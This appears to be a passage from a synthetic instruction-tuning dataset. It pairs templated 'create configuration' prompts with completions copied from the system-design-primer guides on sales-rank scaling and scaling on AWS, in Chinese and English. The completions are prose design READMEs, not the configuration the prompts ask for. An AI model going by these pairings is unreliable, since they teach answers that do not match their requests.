design\n\n> Identify and address bottlenecks, given the constraints.\n\n![Imgur](http://i.imgur.com/MzExP06.png)\n\n**Important: Do not simply jump right into the final design from the initial design!**\n\nState you would 1) **Benchmark/Load Test**, 2) **Profile** for bottlenecks 3) address bottlenecks while evaluating alternatives and trade-offs, and 4) repeat.  See [Design a system that scales to millions of users on AWS](../scaling_aws/README.md) as a sample on how to iteratively scale the initial design.\n\nIt's important to discuss what bottlenecks you might encounter with the initial design and how you might address each of them.  For example, what issues are addressed by adding a **Load Balancer** with multiple **Web Servers**?  **CDN**?  **Master-Slave Replicas**?  What are the alternatives and **Trade-Offs** for each?\n\nWe'll introduce some components to complete the design and to address scalability issues.  Internal load balancers are not shown to reduce clutter.\n\n*To avoid repeating discussions*, refer to the following [system design topics](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) for main talking points, tradeoffs, and alternatives:\n\n* [DNS](https://github.com/donnemartin/system-design-primer#domain-name-system)\n* [CDN](https://github.com/donnemartin/system-design-primer#content-delivery-network)\n* [Load balancer](https://github.com/donnemartin/system-design-primer#load-balancer)\n* [Horizontal scaling](https://github.com/donnemartin/system-design-primer#horizontal-scaling)\n* [Web server (reverse proxy)](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n* [API server (application layer)](https://github.com/donnemartin/system-design-primer#application-layer)\n* [Cache](https://github.com/donnemartin/system-design-primer#cache)\n* [Relational database management system (RDBMS)](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms)\n* [SQL write master-slave failover](https://github.com/donnemartin/system-design-primer#fail-over)\n* [Master-slave replication](https://github.com/donnemartin/system-design-primer#master-slave-replication)\n* [Consistency patterns](https://github.com/donnemartin/system-design-primer#consistency-patterns)\n* [Availability patterns](https://github.com/donnemartin/system-design-primer#availability-patterns)\n\nThe **Analytics Database** could use a data warehousing solution such as Amazon Redshift or Google BigQuery.\n\nWe might only want to store a limited time period of data in the database, while storing the rest in a data warehouse or in an **Object Store**.  An **Object Store** such as Amazon S3 can comfortably handle the constraint of 40 GB of new content per month.\n\nTo address the 40,000 *average* read requests per second (higher at peak), traffic for popular content (and their sales rank) should be handled by the **Memory Cache** instead of the database.  The **Memory Cache** is also useful for handling the unevenly distributed traffic and traffic spikes.  With the large volume of reads, the **SQL Read Replicas** might not be able to handle the cache misses.  We'll probably need to employ additional SQL scaling patterns.\n\n400 *average* writes per second (higher at peak) might be tough for a single **SQL Write Master-Slave**, also pointing to a need for additional scaling techniques.\n\nSQL scaling patterns include:\n\n* [Federation](https://github.com/donnemartin/system-design-primer#federation)\n* [Sharding](https://github.com/donnemartin/system-design-primer#sharding)\n* [Denormalization](https://github.com/donnemartin/system-design-primer#denormalization)\n* [SQL Tuning](https://github.com/donnemartin/system-design-primer#sql-tuning)\n\nWe should also consider moving some data to a **NoSQL Database**.\n\n## Additional talking points\n\n> Additional topics to dive into, depending on the problem scope and time remaining.\n\n#### NoSQL\n\n* [Key-value store](https://github.com/donnemartin/system-design-primer#key-value-store)\n* [Document store](https://github.com/donnemartin/system-design-primer#document-store)\n* [Wide column store](https://github.com/donnemartin/system-design-primer#wide-column-store)\n* [Graph database](https://github.com/donnemartin/system-design-primer#graph-database)\n* [SQL vs NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql)\n\n### Caching\n\n* Where to cache\n    * [Client caching](https://github.com/donnemartin/system-design-primer#client-caching)\n    * [CDN caching](https://github.com/donnemartin/system-design-primer#cdn-caching)\n    * [Web server caching](https://github.com/donnemartin/system-design-primer#web-server-caching)\n    * [Database caching](https://github.com/donnemartin/system-design-primer#database-caching)\n    * [Application caching](https://github.com/donnemartin/system-design-primer#application-caching)\n* What to cache\n    * [Caching at the database query level](https://github.com/donnemartin/system-design-primer#caching-at-the-database-query-level)\n    * [Caching at the object level](https://github.com/donnemartin/system-design-primer#caching-at-the-object-level)\n* When to update the cache\n    * [Cache-aside](https://github.com/donnemartin/system-design-primer#cache-aside)\n    * [Write-through](https://github.com/donnemartin/system-design-primer#write-through)\n    * [Write-behind (write-back)](https://github.com/donnemartin/system-design-primer#write-behind-write-back)\n    * [Refresh ahead](https://github.com/donnemartin/system-design-primer#refresh-ahead)\n\n### Asynchronism and microservices\n\n* [Message queues](https://github.com/donnemartin/system-design-primer#message-queues)\n* [Task queues](https://github.com/donnemartin/system-design-primer#task-queues)\n* [Back pressure](https://github.com/donnemartin/system-design-primer#back-pressure)\n* [Microservices](https://github.com/donnemartin/system-design-primer#microservices)\n\n### Communications\n\n* Discuss tradeoffs:\n    * External communication with clients - [HTTP APIs following REST](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest)\n    * Internal communications - [RPC](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc)\n* [Service discovery](https://github.com/donnemartin/system-design-primer#service-discovery)\n\n### Security\n\nRefer to the [security section](https://github.com/donnemartin/system-design-primer#security).\n\n### Latency numbers\n\nSee [Latency numbers every programmer should know](https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know).\n\n### Ongoing\n\n* Continue benchmarking and monitoring your system to address bottlenecks as they come up\n* Scaling is an iterative process\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/system_design/sales_rank/README.md", "language": "markdown", "complexity": "complex", "star_count": 312958, "quality_score": 0.92, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": true, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 339}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# 在 AWS 上设计支持百万级到千万级用户的系统\n\n**注释：为了避免重复，这篇文章的链接直接关联到 [系统设计主题](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) 的相关章节。为一讨论要点、折中方案和可选方案做参考。**\n\n## 第 1 步：用例和约束概要\n\n> 收集需求并调查问题。\n> 通过提问清晰用例和约束。\n> 讨论假设。\n\n如果没有面试官提出明确的问题，我们将自己定义一些用例和约束条件。\n\n### 用例\n\n解决这个问题是一个循序渐进的过程：1) **基准/负载 测试**， 2) 瓶颈 **概述**， 3) 当评估可选和折中方案时定位瓶颈，4) 重复，这是向可扩展的设计发展基础设计的好模式。\n\n除非你有 AWS 的背景或者正在申请需要 AWS 知识的相关职位，否则不要求了解 AWS 的相关细节。并且，这个练习中讨论的许多原则可以更广泛地应用于AWS生态系统之外。\n\n#### 我们就处理以下用例讨论这一问题\n\n* **用户** 进行读或写请求\n    * **服务** 进行处理，存储用户数据，然后返回结果\n* **服务** 需要从支持小规模用户开始到百万用户\n    * 在我们演化架构来处理大量的用户和请求时，讨论一般的扩展模式\n* **服务** 高可用\n\n### 约束和假设\n\n#### 状态假设\n\n* 流量不均匀分布\n* 需要关系数据\n* 从一个用户扩展到千万用户\n    * 表示用户量的增长\n        * 用户量+\n        * 用户量++\n        * 用户量+++\n        * ...\n    * 1000 万用户\n    * 每月 10 亿次写入\n    * 每月 1000 亿次读出\n    * 100:1 读写比率\n    * 每次写入 1 KB 内容\n\n#### 计算使用\n\n**向你的面试官厘清你是否应该做粗略的使用计算**\n\n* 1 TB 新内容 / 月\n    * 1 KB 每次写入 * 10 亿 写入 / 月\n    * 36 TB 新内容 / 3 年\n    * 假设大多数写入都是新内容而不是更新已有内容\n* 平均每秒 400 次写入\n* 平均每秒 40,000 次读取\n\n便捷的转换指南：\n\n* 250 万秒 / 月\n* 1 次请求 / 秒 = 250 万次请求 / 月\n* 40 次请求 / 秒 = 1 亿次请求 / 月\n* 400 次请求 / 秒 = 10 亿请求 / 月\n\n## 第 2 步：创建高级设计方案\n\n> 用所有重要组件概述高水平设计\n\n![Imgur](http://i.imgur.com/B8LDKD7.png)\n\n## 第 3 步：设计核心组件\n\n> 深入每个核心组件的细节。\n\n### 用例：用户进行读写请求\n\n#### 目标\n\n* 只有 1-2 个用户时，你只需要基础配置\n    * 为简单起见，只需要一台服务器\n    * 必要时进行纵向扩展\n    * 监控以确定瓶颈\n\n#### 以单台服务器开始\n\n* **Web 服务器** 在 EC2 上\n    * 存储用户数据\n    * [**MySQL 数据库**](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms)\n\n运用 **纵向扩展**：\n\n* 选择一台更大容量的服务器\n* 密切关注指标，确定如何扩大规模\n    * 使用基本监控来确定瓶颈:CPU、内存、IO、网络等\n    * CloudWatch, top, nagios, statsd, graphite等\n* 纵向扩展的代价将变得更昂贵\n* 无冗余/容错\n\n**折中方案, 可选方案, 和其他细节:**\n\n* **纵向扩展** 的可选方案是 [**横向扩展**](https://github.com/donnemartin/system-design-primer#horizontal-scaling)\n\n#### 自 SQL 开始，但认真考虑 NoSQL\n\n约束条件假设需要关系型数据。我们可以开始时在单台服务器上使用 **MySQL 数据库**。\n\n**折中方案, 可选方案, 和其他细节:**\n\n* 查阅 [关系型数据库管理系统 (RDBMS)](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms) 章节\n* 讨论使用 [SQL 或 NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql) 的原因\n\n#### 分配公共静态 IP\n\n* 弹性 IP 提供了一个公共端点，不会在重启时改变 IP。\n* 故障转移时只需要把域名指向新 IP。\n\n#### 使用 DNS 服务\n\n添加 **DNS** 服务，比如 Route 53（[Amazon Route 53](https://aws.amazon.com/cn/route53/) - 译者注），将域映射到实例的公共 IP 中。\n\n**折中方案, 可选方案, 和其他细节:**\n\n* 查阅 [域名系统](https://github.com/donnemartin/system-design-primer#domain-name-system) 章节\n\n#### 安全的 Web 服务器\n\n* 只开放必要的端口\n    * 允许 Web 服务器响应来自以下端口的请求\n        * HTTP 80\n        * HTTPS 443\n        * SSH IP 白名单 22\n    * 防止 Web 服务器启动外链\n\n**折中方案, 可选方案, 和其他细节:**\n\n* 查阅 [安全](https://github.com/donnemartin/system-design-primer#security) 章节\n\n## 第 4 步：扩展设计\n\n> 在给定约束条件下，定义和确认瓶颈。\n\n### 用户+\n\n![Imgur](http://i.imgur.com/rrfjMXB.png)\n\n#### 假设\n\n我们的用户数量开始上升，并且单台服务器的负载上升。**基准/负载测试** 和 **分析** 指出 **MySQL 数据库** 占用越来越多的内存和 CPU 资源，同时用户数据将填满硬盘空间。\n\n目前，我们尚能在纵向扩展时解决这些问题。不幸的是，解决这些问题的代价变得相当昂贵，并且原来的系统并不能允许在 **MySQL 数据库** 和 **Web 服务器** 的基础上进行独立扩展。\n\n#### 目标\n\n* 减轻单台服务器负载并且允许独立扩展\n    * 在 **对象存储** 中单独存储静态内容\n    * 将 **MySQL 数据库** 迁移到单独的服务器上\n* 缺点\n    * 这些变化会增加复杂性，并要求对 **Web服务器** 进行更改，以指向 **对象存储** 和 **MySQL 数据库**\n    * 必须采取额外的安全措施来确保新组件的安全\n    * AWS 的成本也会增加，但应该与自身管理类似系统的成本做比较\n\n#### 独立保存静态内容\n\n* 考虑使用像 S3 这样可管理的 **对象存储** 服务来存储静态内容\n    * 高扩展性和可靠性\n    * 服务器端加密\n* 迁移静态内容到 S3\n    * 用户文件\n    * JS\n    * CSS\n    * 图片\n    * 视频\n\n#### 迁移 MySQL 数据库到独立机器上\n\n* 考虑使用类似 RDS 的服务来管理 **MySQL 数据库**\n    * 简单的管理，扩展\n    * 多个可用区域\n    * 空闲时加密\n\n#### 系统安全\n\n* 在传输和空闲时对数据进行加密\n* 使用虚拟私有云\n    * 为单个 **Web 服务器** 创建一个公共子网，这样就可以发送和接收来自 internet 的流量\n    * 为其他内容创建一个私有子网，禁止外部访问\n    * 在每个组件上只为白名单 IP 打开端口\n* 这些相同的模式应当在新的组件的实现中实践\n\n**折中方案, 可选方案, 和其他细节:**\n\n* 查阅 [安全](https://github.com/donnemartin/system-design-primer#security) 章节\n\n### 用户+++\n\n![Imgur](http://i.imgur.com/raoFTXM.png)\n\n#### 假设\n\n我们的 **基准/负载测试** 和 **性能测试** 显示，在高峰时段，我们的单一 **Web服务器** 存在瓶颈，导致响应缓慢，在某些情况下还会宕机。随着服务的成熟，我们也希望朝着更高的可用性和冗余发展。\n\n#### 目标\n\n* 下面的目标试图用 **Web服务器** 解决扩展问题\n    * 基于 **基准/负载测试** 和 **分析**，你可能只需要实现其中的一两个技术\n* 使用 [**横向扩展**](https://github.com/donnemartin/system-design-primer#horizontal-scaling) 来处理增加的负载和单点故障\n    * 添加 [**负载均衡器**](https://github.com/donnemartin/system-design-primer#load-balancer) 例如 Amazon 的 ELB 或 HAProxy\n        * ELB 是高可用的\n        * 如果你正在配置自己的 **负载均衡器**, 在多个可用区域中设置多台服务器用于 [双活](https://github.com/donnemartin/system-design-primer#active-active) 或 [主被](https://github.com/donnemartin/system-design-primer#active-passive) 将提高可用性\n        * 终止在 **负载平衡器** 上的SSL，以减少后端服务器上的计算负载，并简化证书管理\n    * 在多个可用区域中使用多台 **Web服务器**\n    * 在多个可用区域的 [**主-从 故障转移**](https://github.com/donnemartin/system-design-primer#master-slave-replication) 模式中使用多个 **MySQL** 实例来改进冗余\n* 分离 **Web 服务器** 和 [**应用服务器**](https://github.com/donnemartin/system-design-primer#application-layer)\n    * 独立扩展和配置每一层\n    * **Web 服务器** 可以作为 [**反向代理**](https://github.com/donnemartin/system-design-primer#reverse-proxy-web-server)\n    * 例如, 你可以添加 **应用服务器** 处理 **读 API** 而另外一些处理 **写 API**\n* 将静态（和一些动态）内容转移到 [**内容分发网络 (CDN)**](https://github.com/donnemartin/system-design-primer#content-delivery-network) 例如 CloudFront 以减少负载和延迟\n\n**折中方案, 可选方案, 和其他细节:**\n\n* 查阅以上链接获得更多细节\n\n### 用户+++\n\n![Imgur](http://i.imgur.com/OZCxJr0.png)\n\n**注意：** **内部负载均衡** 不显示以减少混乱\n\n#### 假设\n\n我们的 **性能/负载测试** 和 **性能测试** 显示我们读操作频繁（100:1 的读写比率），并且数据库在高读请求时表现很糟糕。\n\n#### 目标\n\n* 下面的目标试图解决 **MySQL数据库** 的伸缩性问题\n    * * 基于 **基准/负载测试** 和 **分析**，你可能只需要实现其中的一两个技术\n* 将下列数据移动到一个 [**内存缓存**](https://github.com/donnemartin/system-design-primer#cache)，例如弹性缓存，以减少负载和延迟：\n    * **MySQL** 中频繁访问的内容\n        * 首先, 尝试配置 **MySQL 数据库** 缓存以查看是否足以在实现 **内存缓存** 之前缓解瓶颈\n    * 来自 **Web 服务器** 的会话数据\n        * **Web 服务器** 变成无状态的, 允许 **自动伸缩**\n    * 从内存中读取 1 MB 内存需要大约 250 微秒，而从SSD中读取时间要长 4 倍，从磁盘读取的时间要长 80 倍。<sup><a href=https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know>1</a></sup>\n* 添加 [**MySQL 读取副本**](https://github.com/donnemartin/system-design-primer#master-slave-replication) 来减少写主线程的负载\n* 添加更多 **Web 服务器** and **应用服务器** 来提高响应\n\n**折中方案, 可选方案, 和其他细节:**\n\n* 查阅以上链接获得更多细节\n\n#### 添加 MySQL 读取副本\n\n* 除了添加和扩展 **内存缓存**，**MySQL 读副本服务器** 也能够帮助缓解在 **MySQL 写主服务器** 的负载。\n* 添加逻辑到 **Web 服务器** 来区分读和写操作\n* 在 **MySQL 读副本服务器** 之上添加 **负载均衡器** （不是为了减少混乱）\n* 大多数服务都是读取负载大于写入负载\n\n**折中方案, 可选方案, 和其他细节:**\n\n* 查阅 [关系型数据库管理系统 (RDBMS)](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms) 章节\n\n### 用户++++\n\n![Imgur](http://i.imgur.com/3X8nmdL.png)\n\n#### 假设\n\n**基准/负载测试** 和 **分析** 显示，在美国，正常工作时间存在流量峰值，当用户离开办公室时，流量骤降。我们认为，可以通过真实负载自动转换服务器数量来降低成本。我们是一家小商店，所以我们希望 DevOps 尽量自动化地进行 **自动伸缩** 和通用操作。\n\n#### 目标\n\n* 根据需要添加 **自动扩展**\n    * 跟踪流量高峰\n    * 通过关闭未使用的实例来降低成本\n* 自动化 DevOps\n    * Chef, Puppet, Ansible 工具等\n* 继续监控指标以解决瓶颈\n    * **主机水平** - 检查一个 EC2 实例\n    * **总水平** - 检查负载均衡器统计数据\n    * **日志分析** - CloudWatch, CloudTrail, Loggly, Splunk, Sumo\n    * **外部站点的性能** - Pingdom or New Relic\n    * **处理通知和事件** - PagerDuty\n    * **错误报告** - Sentry\n\n#### 添加自动扩展\n\n* 考虑使用一个托管服务，比如AWS **自动扩展**\n    * 为每个 **Web 服务器** 创建一个组，并为每个 **应用服务器** 类型创建一个组，将每个组放置在多个可用区域中\n    * 设置最小和最大实例数\n    * 通过 CloudWatch 来扩展或收缩\n        * 可预测负载的简单时间度量\n        * 一段时间内的指标：\n            * CPU 负载\n            * 延迟\n            * 网络流量\n            * 自定义指标\n    * 缺点\n        * 自动扩展会引入复杂性\n        * 可能需要一段时间才能适当扩大规模，以满足增加的需求，或者在需求下降时缩减规模\n\n### 用户+++++\n\n![Imgur](http://i.imgur.com/jj3A5N8.png)\n\n**注释：** **自动伸缩** 组不显示以减少混乱\n\n#### 假设\n\n当服务继续向着限制条件概述的方向发展，我们反复地运行 **基准/负载测试** 和 **分析** 来进一步发现和定位新的瓶颈。\n\n#### 目标\n\n由于问题的约束，我们将继续提出扩展性的问题：\n\n* 如果我们的 **MySQL 数据库** 开始变得过于庞大, 我们可能只考虑把数据在数据库中存储一段有限的时间, 同时在例如 Redshift 这样的数据仓库中存储其余的数据\n    * 像 Redshift 这样的数据仓库能够轻松处理每月 1TB 的新内容\n* 平均每秒 40,000 次的读取请求, 可以通过扩展 **内存缓存** 来处理热点内容的读取流量，这对于处理不均匀分布的流量和流量峰值也很有用\n    * **SQL读取副本** 可能会遇到处理缓存未命中的问题, 我们可能需要使用额外的 SQL 扩展模式\n* 对于单个 **SQL 写主-从** 模式来说，平均每秒 400 次写操作（明显更高）可能会很困难，同时还需要更多的扩展技术\n\nSQL 扩展模型包括：\n\n* [集合](https://github.com/donnemartin/system-design-primer#federation)\n* [分片](https://github.com/donnemartin/system-design-primer#sharding)\n* [反范式](https://github.com/donnemartin/system-design-primer#denormalization)\n* [SQL 调优](https://github.com/donnemartin/system-design-primer#sql-tuning)\n\n为了进一步处理高读和写请求，我们还应该考虑将适当的数据移动到一个 [**NoSQL数据库**](https://github.com/donnemartin/system-design-primer#nosql) ，例如 DynamoDB。\n\n我们可以进一步分离我们的 [**应用服务器**](https://github.com/donnemartin/system-design-primer#application-layer) 以允许独立扩展。不需要实时完成的批处理任务和计算可以通过 Queues 和 Workers 异步完成：\n\n* 以照片服务为例，照片上传和缩略图的创建可以分开进行\n    * **客户端** 上传图片\n    * **应用服务器** 推送一个任务到 **队列** 例如 SQS\n    * EC2 上的 **Worker 服务** 或者 Lambda 从 **队列** 拉取 work，然后：\n        * 创建缩略图\n        * 更新 **数据库**\n        * 在 **对象存储** 中存储缩略图\n\n**折中方案, 可选方案, 和其他细节:**\n\n* 查阅以上链接获得更多细节\n\n## 额外的话题\n\n> 根据问题的范围和剩余时间，还需要深入讨论其他问题。\n\n### SQL 扩展模式\n\n* [读取副本](https://github.com/donnemartin/system-design-primer#master-slave-replication)\n* [集合](https://github.com/donnemartin/system-design-primer#federation)\n* [分区](https://github.com/donnemartin/system-design-primer#sharding)\n* [反规范化](https://github.com/donnemartin/system-design-primer#denormalization)\n* [SQL 调优](https://github.com/donnemartin/system-design-primer#sql-tuning)\n\n#### NoSQL\n\n* [键值存储](https://github.com/donnemartin/system-design-primer#key-value-store)\n* [文档存储](https://github.com/donnemartin/system-design-primer#document-store)\n* [宽表存储](https://github.com/donnemartin/system-design-primer#wide-column-store)\n* [图数据库](https://github.com/donnemartin/system-design-primer#graph-database)\n* [SQL vs NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql)\n\n### 缓存\n\n* 缓存到哪里\n    * [客户端缓存](https://github.com/donnemartin/system-design-primer#client-caching)\n    * [CDN 缓存](https://github.com/donnemartin/system-design-primer#cdn-caching)\n    * [Web 服务缓存](https://github.com/donnemartin/system-design-primer#web-server-caching)\n    * [数据库缓存](https://github.com/donnemartin/system-design-primer#database-caching)\n    * [应用缓存](https://github.com/donnemartin/system-design-primer#application-caching)\n* 缓存什么\n    * [数据库请求层缓存](https://github.com/donnemartin/system-design-primer#caching-at-the-database-query-level)\n    * [对象层缓存](https://github.com/donnemartin/system-design-primer#caching-at-the-object-level)\n* 何时更新缓存\n    * [预留缓存](https://github.com/donnemartin/system-design-primer#cache-aside)\n    * [完全写入](https://github.com/donnemartin/system-design-primer#write-through)\n    * [延迟写 (写回)](https://github.com/donnemartin/system-design-primer#write-behind-write-back)\n    * [事先更新](https://github.com/donnemartin/system-design-primer#refresh-ahead)\n\n### 异步性和微服务\n\n* [消息队列](https://github.com/donnemartin/system-design-primer#message-queues)\n* [任务队列](https://github.com/donnemartin/system-design-primer#task-queues)\n* [回退压力](https://github.com/donnemartin/system-design-primer#back-pressure)\n* [微服务](https://github.com/donnemartin/system-design-primer#microservices)\n\n### 沟通\n\n* 关于折中方案的讨论:\n    * 客户端的外部通讯 - [遵循 REST 的 HTTP APIs](https://github.com/donnemartin/system-design-primer#representational-state-transfer-rest)\n    * 内部通讯 - [RPC](https://github.com/donnemartin/system-design-primer#remote-procedure-call-rpc)\n* [服务探索](https://github.com/donnemartin/system-design-primer#service-discovery)\n\n### 安全性\n\n参考 [安全章节](https://github.com/donnemartin/system-design-primer#security)\n\n### 延迟数字指标\n\n查阅 [每个程序员必懂的延迟数字](https://github.com/donnemartin/system-design-primer#latency-numbers-every-programmer-should-know)\n\n### 正在进行\n\n* 继续基准测试并监控你的系统以解决出现的瓶颈问题\n* 扩展是一个迭代的过程\n", "metadata": {"source": "github.com/donnemartin/system-design-primer", "file_path": "solutions/system_design/scaling_aws/README-zh-Hans.md", "language": "markdown", "complexity": "complex", "star_count": 312958, "quality_score": 0.8, "features": {"has_microservices": true, "has_api_design": true, "has_load_balancing": true, "has_caching": true, "has_database_design": true, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": true, "has_containers": false, "has_diagrams": true, "line_count": 404}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "scalability_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design scalable system architecture with load balancing and caching using microservices design patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# Design a system that scales to millions of users on AWS\n\n*Note: This document links directly to relevant areas found in the [system design topics](https://github.com/donnemartin/system-design-primer#index-of-system-design-topics) to avoid duplication.  Refer to the linked content for general talking points, tradeoffs, and alternatives.*\n\n## Step 1: Outline use cases and constraints\n\n> Gather requirements and scope the problem.\n> Ask questions to clarify use cases and constraints.\n> Discuss assumptions.\n\nWithout an interviewer to address clarifying questions, we'll define some use cases and constraints.\n\n### Use cases\n\nSolving this problem takes an iterative approach of: 1) **Benchmark/Load Test**, 2) **Profile** for bottlenecks 3) address bottlenecks while evaluating alternatives and trade-offs, and 4) repeat, which is good pattern for evolving basic designs to scalable designs.\n\nUnless you have a background in AWS or are applying for a position that requires AWS knowledge, AWS-specific details are not a requirement.  However, **much of the principles discussed in this exercise can apply more generally outside of the AWS ecosystem.**\n\n#### We'll scope the problem to handle only the following use cases\n\n* **User** makes a read or write request\n    * **Service** does processing, stores user data, then returns the results\n* **Service** needs to evolve from serving a small amount of users to millions of users\n    * Discuss general scaling patterns as we evolve an architecture to handle a large number of users and requests\n* **Service** has high availability\n\n### Constraints and assumptions\n\n#### State assumptions\n\n* Traffic is not evenly distributed\n* Need for relational data\n* Scale from 1 user to tens of millions of users\n    * Denote increase of users as:\n        * Users+\n        * Users++\n        * Users+++\n        * ...\n    * 10 million users\n    * 1 billion writes per month\n    * 100 billion reads per month\n    * 100:1 read to write ratio\n    * 1 KB content per write\n\n#### Calculate usage\n\n**Clarify with your interviewer if you should run back-of-the-envelope usage calculations.**\n\n* 1 TB of new content per month\n    * 1 KB per write * 1 billion writes per month\n    * 36 TB of new content in 3 years\n    * Assume most writes are from new content instead of updates to existing ones\n* 400 writes per second on average\n* 40,000 reads per second on average\n\nHandy conversion guide:\n\n* 2.5 million seconds per month\n* 1 request per second = 2.5 million requests per month\n* 40 requests per second = 100 million requests per month\n* 400 requests per second = 1 billion requests per month\n\n## Step 2: Create a high level design\n\n> Outline a high level design with all important components.\n\n![Imgur](http://i.imgur.com/B8LDKD7.png)\n\n## Step 3: Design core components\n\n> Dive into details for each core component.\n\n### Use case: User makes a read or write request\n\n#### Goals\n\n* With only 1-2 users, you only need a basic setup\n    * Single box for simplicity\n    * Vertical scaling when needed\n    * Monitor to determine bottlenecks\n\n#### Start with a single box\n\n* **Web server** on EC2\n    * Storage for user data\n    * [**MySQL Database**](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms)\n\nUse **Vertical Scaling**:\n\n* Simply choose a bigger box\n* Keep an eye on metrics to determine how to scale up\n    * Use basic monitoring to determine bottlenecks: CPU, memory, IO, network, etc\n    * CloudWatch, top, nagios, statsd, graphite, etc\n* Scaling vertically can get very expensive\n* No redundancy/failover\n\n*Trade-offs, alternatives, and additional details:*\n\n* The alternative to **Vertical Scaling** is [**Horizontal scaling**](https://github.com/donnemartin/system-design-primer#horizontal-scaling)\n\n#### Start with SQL, consider NoSQL\n\nThe constraints assume there is a need for relational data.  We can start off using a **MySQL Database** on the single box.\n\n*Trade-offs, alternatives, and additional details:*\n\n* See the [Relational database management system (RDBMS)](https://github.com/donnemartin/system-design-primer#relational-database-management-system-rdbms) section\n* Discuss reasons to use [SQL or NoSQL](https://github.com/donnemartin/system-design-primer#sql-or-nosql)\n\n#### Assign a public static IP\n\n* Elastic IPs provide a public endpoint whose IP doesn't change on reboot\n* Helps with failover, just point the domain to a new IP\n\n#### Use a DNS\n\nAdd a **DNS** such as Route 53 to map the domain to the instance's public IP.\n\n*Trade-offs, alternatives, and additional details:*\n\n* See the [Domain name system](https://github.com/donnemartin/system-design-primer#domain-name-system) section\n\n#### Secure the web server\n\n* Open up only necessary ports\n    * Allow the web server to respond to incoming requests from:\n        * 80 for HTTP\n        * 443 for HTTPS\n        * 22 for SSH to only whitelisted IPs\n    * Prevent the web server from initiating outbound connections\n\n*Trade-offs, alternatives, and additional details:*\n\n* See the [Security](https://github.com/donnemartin/system-design-primer#security) section\n\n## Step 4: Scale the design\n\n> Identify and address bottlenecks, given the constraints.\n\n### Users+\n\n![Imgur](http://i.imgur.com/rrfjMXB.png)\n\n#### Assumptions\n\nOur user count is starting to pick up and the load is increasing on our single box.  Our **Benchmarks/Load Tests** and **Profiling** are pointing to the **MySQL Database** taking up more and more memory and CPU resources, while the user content is filling up disk space.\n\nWe've been able to address these issues with **Vertical Scaling** so far.  Unfortunately, this has become quite expensive and it doesn't allow for independent scaling of the **MySQL Database** and **Web Server**.\n\n#### Goals\n\n* Lighten load on the single box and allow for independent scaling\n    * Store static content separately in an **Object Store**\n    * Move the **MySQL Database** to a separate box\n* Disadvantages\n    * These changes would increase complexity and would require changes to the **Web Server** to point to the **Object Store** and the **MySQL Database**\n    * Additional security measures must be taken to secure the new components\n    * AWS costs could also increase, but should be weighed with the costs of managing similar systems on your own\n\n#### Store static content separately\n\n* Consider using a managed **Object Store** like S3 to store static content\n    * Highly scalable and reliable\n    * Server side encryption\n* Move static content to S3\n    * User files\n    * JS\n    * CSS\n    * Images\n    * Videos\n\n#### Move the MySQL database to a separate box\n\n* Consider using a service like RDS to manage the **MySQL Database**\n    * Simple to administer, scale\n    * Multiple availability zones\n    * Encryption at rest\n\n#### Secure the system\n\n* Encrypt data in transit and at rest\n* Use a Virtual Private Cloud\n    * Create a public subnet for the single **Web Server** so it can send and receive traffic from the internet\n    * Create a private subnet for everything else, preventing outside access\n    * Only open ports from whitelisted IPs for each component\n* These same patterns should be implemented for new components in the remainder of the exercise\n\n*Trade-offs, alternatives, and additional details:*\n\n* See the [Security](https://github.com/donnemartin/system-design-primer#security) section\n\n### Users++\n\n![Imgur](http://i.imgur.com/raoFTXM.png)\n\n#### Assumptions\n\nOur **Benchmarks/Load Tests** and **Profiling** show that our single **Web Server** bottlenecks during peak hours, resulting in slow responses and in some cases, downtime.  As the service matures, we'd also like to move towards higher availability and redundancy.\n\n#### Goals\n\n* The following goals attempt to address the scaling issues with the **Web Server**\n    * Based on the **Benchmarks/Load Tests** and **Profiling**, you might only need to implement one or two of these techniques\n* Use [**Horizontal Scaling**](https://github.com/donnemartin/system-design-primer#horizontal-scaling) to handle increasing loads and to address single points of failure\n    * Add a [**Load Balancer**](https://github.com/donnemartin/system-design-primer#load-balancer) such as Amazon's ELB or HAProxy\n        * ELB is highly available\n        * If you are configuring your own **Load Balancer**, setting up multiple servers in [active-active](https://github.com/donnemartin/system-design-primer#active-active) or [active-passive](https://github.com/donnemartin/system-design-primer#active-passive) in multiple availability zones will improve availability\n        * Terminate SSL on the **Load Balancer** to reduce computational load on backend servers and to simplify certificate administration\n    * Use multiple **Web Servers** spread out over multiple availability zones\n    * Use multiple **MySQL** instances in [**Master-Slave Failover**](https://github.com/donnemartin/system-design-primer#master-slave-replication) mode across multiple availability zones to improve redundancy\n* Separate out the **Web Servers** from the [**Application Servers**](https://github.com/donnemartin/system-design-primer#application-layer)\n    * Scale and configure both layers independently\n    * **Web Servers** can run as a [**Reverse 